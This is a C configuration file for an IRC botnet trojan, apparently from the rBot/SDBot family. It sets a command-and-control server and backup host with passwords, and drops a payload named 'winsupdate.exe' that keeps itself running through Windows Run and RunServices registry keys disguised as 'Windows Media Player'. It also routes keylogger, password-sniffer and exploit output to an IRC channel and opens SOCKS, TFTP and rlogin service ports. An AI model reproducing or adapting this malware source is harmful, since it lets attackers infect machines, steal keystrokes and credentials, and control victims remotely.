// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 12221;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '^';				// command prefix (one character max.)
int maxrand = 7;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;	    // nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.exe";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.
char botid[] = "peti";						            // bot id
char version[] = "[peti]";		// Bots !version reply
char password[] = "'canabis'";				        	// bot password
char server[] = "-";		                    // server
char serverpass[] = "";						            // server password
char channel[] = "-";				            // channel that the bot should join
char chanpass[] = "-";						            // channel password
char server2[] = "thepranks.ath.cx";					     	// backup server (optional)
char channel2[] = "-";					    	// backup channel (optional)
char chanpass2[] = "'trillian'";						            // backup channel password (optional)
char filename[] = "winsupdate.exe";			                // destination file name
char keylogfile[] = "keys.txt";				            // keylog filename
char valuename[] = "Windows Media Player";		                    // value name for autostart
char nickconst[] = "DJAP|";					        // first part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";	// Payload filename
char modeonconn[] = "-x+i";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#DJAndyP";					// Channel where exploit messages get redirected
char keylogchan[] = "#DJAndyP";						// Channel where keylog messages get redirected
char psniffchan[] = "#DJAndyP";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@FBI.gov",
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "qar9x3bt4f32km4x"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
